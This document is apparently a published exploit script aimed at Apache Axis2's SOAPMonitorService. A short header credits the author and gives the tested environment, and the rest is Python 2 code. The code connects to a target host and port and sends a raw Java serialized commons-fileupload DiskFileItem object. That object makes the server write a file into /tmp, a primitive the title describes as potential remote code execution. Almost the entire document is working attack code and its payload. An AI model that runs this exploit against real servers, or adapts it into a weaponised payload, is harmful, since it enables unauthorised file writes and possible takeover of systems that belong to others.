#####################################################################################
#                                                                                   #
# Exploit Title: AXIS2 - 1.7.4+ SOAPMonitorService file upload (potential RCE)      #
# Date: 22/01/2017                                                                  #
# Exploit Author: Fernando Garcia - fergarrui - at - gmail                          #
# Vendor Homepage: http://axis.apache.org/                                          #
# Software link: http://axis.apache.org/axis2/java/core/download.html               #
# Version: 1.7.4+                                                                   #
# Tested on : linux x64, tomcat8, jre 1.8.0_111-b14                                 #
#                                                                                   #
#####################################################################################


import socket
import sys

host = sys.argv[1]
port = sys.argv[2]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "Connecting to: " + host + ":" + port
sock.connect((host, int(port)))
print "Connected."

payload = '\xac\xed\x00\x05\x73\x72\x00\x2f\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x66\x69\x6c\x65\x75\x70\x6c\x6f\x61\x64\x2e\x64\x69\x73\x6b\x2e\x44\x69\x73\x6b\x46\x69\x6c\x65\x49\x74\x65\x6d\x1f\x0d\x72\x26\x83\x9a\x88\x71\x03\x00\x0a\x5a\x00\x0b\x69\x73\x46\x6f\x72\x6d\x46\x69\x65\x6c\x64\x4a\x00\x04\x73\x69\x7a\x65\x49\x00\x0d\x73\x69\x7a\x65\x54\x68\x72\x65\x73\x68\x6f\x6c\x64\x5b\x00\x0d\x63\x61\x63\x68\x65\x64\x43\x6f\x6e\x74\x65\x6e\x74\x74\x00\x02\x5b\x42\x4c\x00\x0b\x63\x6f\x6e\x74\x65\x6e\x74\x54\x79\x70\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x08\x64\x66\x6f\x73\x46\x69\x6c\x65\x74\x00\x0e\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x46\x69\x6c\x65\x3b\x4c\x00\x09\x66\x69\x65\x6c\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x4c\x00\x07\x68\x65\x61\x64\x65\x72\x73\x74\x00\x2f\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x66\x69\x6c\x65\x75\x70\x6c\x6f\x61\x64\x2f\x46\x69\x6c\x65\x49\x74\x65\x6d\x48\x65\x61\x64\x65\x72\x73\x3b\x4c\x00\x0a\x72\x65\x70\x6f\x73\x69\x74\x6f\x72\x79\x71\x00\x7e\x00\x03\x78\x70\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x00\x0e\x50\x52\x4f\x4f\x46\x4f\x46\x43\x4f\x4e\x43\x45\x50\x54\x74\x00\x18\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6f\x63\x74\x65\x74\x2d\x73\x74\x72\x65\x61\x6d\x70\x74\x00\x04\x74\x65\x73\x74\x71\x00\x7e\x00\x09\x70\x73\x72\x00\x0c\x6a\x61\x76\x61\x2e\x69\x6f\x2e\x46\x69\x6c\x65\x04\x2d\xa4\x45\x0e\x0d\xe4\xff\x03\x00\x01\x4c\x00\x04\x70\x61\x74\x68\x71\x00\x7e\x00\x02\x78\x70\x74\x00\x04\x2f\x74\x6d\x70\x77\x02\x00\x2f\x78\x78'



print "Sending payload... " 
sock.send(payload)

resp2 = sock.recv(10000)

print "Payload sent. Response: " + resp2.encode("hex")
print "Closing connection"
sock.shutdown(1)
sock.close();
print "Exiting"
